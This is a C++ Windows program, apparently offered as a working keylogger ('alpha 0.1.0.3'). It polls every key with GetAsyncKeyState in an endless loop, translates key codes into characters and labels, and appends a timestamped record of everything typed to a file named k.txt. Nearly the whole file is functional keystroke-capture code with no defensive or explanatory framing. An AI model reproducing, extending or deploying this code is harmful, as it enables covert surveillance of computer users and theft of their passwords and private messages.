#include <windows.h>
#include <string>
#include <fstream>
#include <cstdio>
using namespace std;

const char *const Version = "alpha 0.1.0.3";

string GetKey(int Key){
	string KeyString = "";
	const int KeyPressMask = 0x80000000;
	int iShift = GetKeyState(0x10); // Shift Key State
	bool IS = (iShift & KeyPressMask) == KeyPressMask;
	if(Key >=186 && Key <=222){
		if(IS){
			switch(Key){
				case 186:
					KeyString = ":"; break;
				case 187:
					KeyString = "+"; break;
				case 188:
					KeyString = "<"; break;
				case 189:
					KeyString = "_"; break;
				case 190:
					KeyString = ">"; break;
				case 191:
					KeyString = "?"; break;
				case 192:
					KeyString = "~"; break;
				case 219:
					KeyString = "{"; break;
				case 220:
					KeyString = "|"; break;
				case 221:
					KeyString = "}"; break;
				case 222:
					KeyString = "\""; break;
			}
		}else switch(Key){
				case 186:
					KeyString = ";"; break;
				case 187:
					KeyString = "="; break;
				case 188:
					KeyString = ","; break;
				case 189:
					KeyString = "-"; break;
				case 190:
					KeyString = "."; break;
				case 191:
					KeyString = "/"; break;
				case 192:
					KeyString = "`"; break;
				case 219:
					KeyString = "["; break;
				case 220:
					KeyString = "\\"; break;
				case 221:
					KeyString = "]"; break;
				case 222:
					KeyString = "'"; break;
		}
	}
	else if (Key >=48 && Key <= 57){
		if(IS){
			switch(Key){
				case 48: // 0
					KeyString = ")"; break;
				case 49: // 1
					KeyString = "!"; break;
				case 50: // 2
					KeyString = "@"; break;
				case 51: // 3
					KeyString = "#"; break;
				case 52: // 4
					KeyString = "$"; break;
				case 53: // 5
					KeyString = "%"; break;
				case 54: // 6
					KeyString = "^"; break;
				case 55: // 7
					KeyString = "&"; break;
				case 56: // 8
					KeyString = "*"; break;
				case 57: // 9
					KeyString = "("; break;
			}
		}
		else KeyString = Key;
	}else if (Key >= 65 && Key <= 90){
		if (GetKeyState(VK_CAPITAL)){
			if(IS) KeyString = Key + 32;
			else KeyString = Key;
		}else{
			if(IS) KeyString = Key;
			else KeyString = Key + 32;
		}
	}else switch(Key){
		case VK_ESCAPE:
			KeyString = "[Esc]"; break;
		case VK_F1:
			KeyString = "[F1]"; break;
		case VK_F2:
			KeyString = "[F2]"; break;
		case VK_F3:
			KeyString = "[F3]"; break;
		case VK_F4:
			KeyString = "[F4]"; break;
		case VK_F5:
			KeyString = "[F5]"; break;
		case VK_F6:
			KeyString = "[F6]"; break;
		case VK_F7:
			KeyString = "[F7]"; break;
		case VK_F8:
			KeyString = "[F8]"; break;
		case VK_F9:
			KeyString = "[F9]"; break;
		case VK_F10:
			KeyString = "[F10]"; break;
		case VK_F11:
			KeyString = "[F11]"; break;
		case VK_F12:
			KeyString = "[F12]"; break;
		case VK_SNAPSHOT:
			KeyString = "[PrtScr]"; break;
		case VK_SCROLL:
			KeyString = "[ScrLk]"; break;
		case VK_PAUSE:
			KeyString = "[Pause]"; break;
		case VK_CAPITAL:
			KeyString = "[CapsLk]"; break;
		case VK_BACK:
			KeyString = "[BK]"; break;
		case VK_RETURN:
			KeyString = "[RET]\n"; break;
		case VK_SPACE:
			KeyString = " "; break;
		case VK_LSHIFT:
			KeyString = "[LShift]"; break;
		case VK_RSHIFT:
			KeyString = "[RShift]"; break;
		case VK_TAB:
			KeyString = "[Tab]"; break;
		case VK_LCONTROL:
			KeyString = "[LCtrl]"; break;
		case VK_RCONTROL:
			KeyString = "[RCtrl]"; break;
		case VK_LMENU:
			KeyString = "[LAlt]"; break;
		case VK_RMENU:
			KeyString = "[RAlt]"; break;
		case VK_LWIN:
			KeyString = "[LWin]"; break;
		case VK_RWIN:
			KeyString = "[RWin]"; break;
		case VK_APPS:
			KeyString = "[Menu]"; break;
		case VK_INSERT:
			KeyString = "[Ins]"; break;
		case VK_DELETE:
			KeyString = "[Del]"; break;
		case VK_HOME:
			KeyString = "[Home]"; break;
		case VK_END:
			KeyString = "[End]"; break;
		case VK_PRIOR:
			KeyString = "[PgUp]"; break;
		case VK_NEXT:
			KeyString = "[PgDn]"; break;
		case VK_LBUTTON:
			KeyString = "[LMB]"; break;
		case VK_RBUTTON:
			KeyString = "[RMB]"; break;
		case VK_VOLUME_MUTE:
			KeyString = "[Mute]"; break;
		case VK_VOLUME_DOWN:
			KeyString = "[Vol-]"; break;
		case VK_VOLUME_UP:
			KeyString = "[Vol+]"; break;
		case VK_MEDIA_NEXT_TRACK:
			KeyString = "[MediaNext]"; break;
		case VK_MEDIA_PREV_TRACK:
			KeyString = "[MediaPrev]"; break;
		case VK_MEDIA_STOP:
			KeyString = "[MediaStop]"; break;
		case VK_MEDIA_PLAY_PAUSE:
			KeyString = "[MediaPlay]"; break;
		case VK_LEFT:
			KeyString = "[Left]"; break;
		case VK_RIGHT:
			KeyString = "[Right]"; break;
		case VK_UP:
			KeyString = "[Up]"; break;
		case VK_DOWN:
			KeyString = "[Down]"; break;
		case VK_NUMLOCK:
			KeyString = "[NumLk]"; break;
		case VK_ADD:
			KeyString = "+"; break;
		case VK_SUBTRACT:
			KeyString = "-"; break;
		case VK_MULTIPLY:
			KeyString = "*"; break;
		case VK_DIVIDE:
			KeyString = "/"; break;
		case VK_DECIMAL:
			KeyString = "."; break;
		case VK_NUMPAD0:
			KeyString = "0"; break;
		case VK_NUMPAD1:
			KeyString = "1"; break;
		case VK_NUMPAD2:
			KeyString = "2"; break;
		case VK_NUMPAD3:
			KeyString = "3"; break;
		case VK_NUMPAD4:
			KeyString = "4"; break;
		case VK_NUMPAD5:
			KeyString = "5"; break;
		case VK_NUMPAD6:
			KeyString = "6"; break;
		case VK_NUMPAD7:
			KeyString = "7"; break;
		case VK_NUMPAD8:
			KeyString = "8"; break;
		case VK_NUMPAD9:
			KeyString = "9"; break;
		// 5 Uncommon Keys
		case VK_CANCEL:
			KeyString = "[Cancel]"; break;
		case VK_CLEAR: // Num5 with NumLock off
			KeyString = "[Clear]"; break;
		case VK_SELECT:
			KeyString = "[Select]"; break;
		case VK_PRINT:
			KeyString = "[Print]"; break;
		case VK_EXECUTE:
			KeyString = "[Execute]"; break;
		default: // Unknown
			KeyString = "[?]"; break;
	}
	return KeyString;
}

string FormatTime(){
	SYSTEMTIME Time;
	GetLocalTime(&Time);
    char cBuf[64];
    snprintf(cBuf, sizeof(cBuf), "%d-%d-%d %d:%02d:%02d", Time.wYear, Time.wMonth, Time.wDay, Time.wHour, Time.wMinute, Time.wSecond);
    string ret = cBuf;
    return ret;
}

int main(){
	const string Filename = "k.txt";
	string str;
	fstream file;
	file.open(Filename.c_str(), ios::out | ios::app);
	file << endl << endl << FormatTime() << endl;
	for(;;){
		Sleep(5);
		for(int i = 8; i <= 255; i ++){
			if(GetAsyncKeyState(i) & 1){
				str = GetKey(i);
				file.write(str.c_str(), str.size());
				file.flush();
			}
		}
	}
}

